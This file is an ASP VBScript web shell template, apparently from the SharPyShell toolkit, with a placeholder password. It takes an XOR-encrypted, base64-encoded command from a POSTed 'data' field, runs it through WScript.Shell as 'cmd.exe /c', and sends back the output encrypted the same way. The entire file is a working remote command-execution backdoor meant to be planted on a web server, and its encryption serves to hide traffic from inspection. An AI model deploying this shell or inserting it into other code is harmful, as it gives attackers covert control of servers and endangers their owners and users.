<%@ LANGUAGE=VBScript %>
<%
Option Explicit
Response.Buffer = True

Dim pwd : pwd = "{{SharPyShell_Placeholder_pwd}}"

Function B64ToBytes(s)
    Dim x, e
    Set x = Server.CreateObject("Microsoft.XMLDOM")
    Set e = x.createElement("t")
    e.DataType = "bin.base64"
    e.Text = s
    B64ToBytes = e.NodeTypedValue
    Set e = Nothing
    Set x = Nothing
End Function

Function BytesToB64(b)
    Dim x, e, r
    Set x = Server.CreateObject("Microsoft.XMLDOM")
    Set e = x.createElement("t")
    e.DataType = "bin.base64"
    e.NodeTypedValue = b
    r = e.Text
    r = Replace(r, vbCrLf, "")
    r = Replace(r, vbLf, "")
    r = Replace(r, vbCr, "")
    BytesToB64 = r
    Set e = Nothing
    Set x = Nothing
End Function

Function BytesToStr(b)
    Dim s
    Set s = Server.CreateObject("ADODB.Stream")
    s.Type = 1
    s.Open
    s.Write b
    s.Position = 0
    s.Type = 2
    s.Charset = "iso-8859-1"
    BytesToStr = s.ReadText
    s.Close
    Set s = Nothing
End Function

Function StrToBytes(t)
    Dim s
    Set s = Server.CreateObject("ADODB.Stream")
    s.Type = 2
    s.Charset = "iso-8859-1"
    s.Open
    s.WriteText t
    s.Position = 0
    s.Type = 1
    StrToBytes = s.Read
    s.Close
    Set s = Nothing
End Function

Function XorStr(txt, key)
    Dim i, r, kl
    r = ""
    kl = Len(key)
    For i = 1 To Len(txt)
        r = r & Chr(Asc(Mid(txt, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod kl) + 1, 1)))
    Next
    XorStr = r
End Function

Dim payload
payload = Request.Form("data")
If Len(payload) > 0 Then
    Dim inBytes, inText, cmd, sh, ex, output, encText, encBytes
    inBytes = B64ToBytes(payload)
    inText = BytesToStr(inBytes)
    cmd = XorStr(inText, pwd)

    Set sh = Server.CreateObject("WScript.Shell")
    On Error Resume Next
    Set ex = sh.Exec("cmd.exe /c " & cmd)
    If Err.Number <> 0 Then
        output = "{{{SharPyShellError}}}" & Err.Description
        Err.Clear
    Else
        output = ex.StdOut.ReadAll() & ex.StdErr.ReadAll()
    End If
    On Error Goto 0

    encText = XorStr(output, pwd)
    encBytes = StrToBytes(encText)
    Response.Write BytesToB64(encBytes)
End If
%>
